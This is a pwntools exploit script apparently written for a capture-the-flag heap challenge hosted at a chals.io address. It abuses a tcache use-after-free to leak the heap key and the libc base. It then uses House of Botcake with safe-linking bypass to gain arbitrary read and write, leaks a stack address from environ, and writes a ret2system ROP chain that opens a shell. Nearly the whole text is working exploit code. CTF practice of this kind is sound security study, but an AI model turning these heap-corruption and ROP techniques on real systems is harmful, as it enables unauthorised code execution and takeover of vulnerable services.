
from pwn import *
binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)
libc = ELF('./libc.so.6')

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=34438
else:
   pass

gs = '''
continue
'''

def create(idx,sz,data):
    #log.info(f"Creating {idx}, {sz}, {data}")
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b'> ')
    p.sendline(b'%i' %idx)
    p.recvuntil(b'> ')
    p.sendline(b'%i' %sz)
    p.recvuntil(b'> ')
    p.send(data)

def delete(idx):
    #log.info(f"Deleting {idx}")
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(b'%i' %idx)

def view(idx):
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.recvuntil(b'> ')
    p.sendline(b'%i' %idx)

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)

def ret_leaks(x,y):
  leaks={}
  for i in range(x,y):
    view(i)
    leak = p.recvline().replace(b'Choose an option:\n',b'')
    addr = int.from_bytes(leak,byteorder='little')
    leaks[i]=addr
  return leaks

def leak_stack():
    view(13)
    leak = p.recvline().replace(b'Choose an option:\n',b'') 
    addr = int.from_bytes(leak[24:32],byteorder='little')
    log.info(f"Stack Leak: {hex(addr)}")
    return addr


p = start()

'''
Stage1
- Leak heap key / libc from use after free in tcache
- House of botcake to gain access to arbitrary read/write
- Use arbitrary read/write to leak stack addr from libc.sym.environ
'''

log.info("Mallocing 7 Items For Tcache")
for i in range(0,7):
  create(i,0x100,b'A'*0x100)

log.info("Creating 2+1 Chunks for unsorted bins")
create(7,0x100,b'A')
create(8,0x100,b'C')
create(9,0x10,b'D')

log.info("Filling Up Tcache")
for i in range(0,7):
  delete(i)

log.info("Freeing bins into unsorted bins")
delete(8)
delete(7)

leaks=ret_leaks(0,32)
key = leaks[0]
libc_leak = leaks[7]
log.info(f"Leaking Heap Key {hex(key)}")
log.info(f"Leaking Libc Main Arean {hex(libc_leak)}")
libc.address=libc_leak-(libc.sym['main_arena']+96)
log.info(f"Libc Base Address {hex(libc.address)}")

log.info("Gaining Write Primitive")
create(10,0x100,b'Z'*0x100)
delete(8)

environ_symbol = libc.sym['environ']-24
log.info(f"Environ Leak: {hex(environ_symbol)}")

malchunk = b'Y'*0x100
malchunk += p64(0x100)
malchunk += p64(0x0)
malchunk += p64(key^environ_symbol)
malchunk += p64(key^0xdeadbeef)

create(11,0x100*2,malchunk)
create(12,0x100,b'Z')

log.info("Leaking stack from libc.sym.environ")
create(13,0x100,b'X'*24)
stack_leak = leak_stack()

'''
Stage2
- House of botcake to gain access to arbitrary read/write
- Write ret2system on stack
'''

log.info("Doing it all over again")
for i in range(14,21):
    create(i,0x90,b'B')

log.info("Creating 2+1 Chunks for unsorted bins")
create(21,0x90,b'A')
create(22,0x90,b'C')
create(23,0x10,b'D')

for i in range(14,21):
    delete(i)

log.info("Freeing bins into unsorted bins")
delete(22)
delete(21)

log.info("Gaining Write Primitive")
create(24,0x90,b'Z')
delete(22)

log.info("Updating heap key, this took 30 minutes to learn")
key = key + 1

stack = (stack_leak - 360) 
log.info(f"Using Stack Addr For Write: {hex(stack)}")

malchunk = b'Y'*0x90
malchunk += p64(0x90)
malchunk += p64(0)
malchunk += p64(key^stack)
malchunk += p64(key^0xdeadbeef)

create(25,0x90*2,malchunk)
create(26,0x90,b'Z')

log.info("Writing ret2system to the stack")

rl = ROP(libc)
chain = p64(rl.find_gadget(['ret'])[0])*2
chain += p64(rl.find_gadget(['pop rdi','ret'])[0])
chain += p64(next(libc.search(b'/bin/sh')))
chain += p64(libc.sym['system'])

create(27,0x90,chain)

p.interactive()
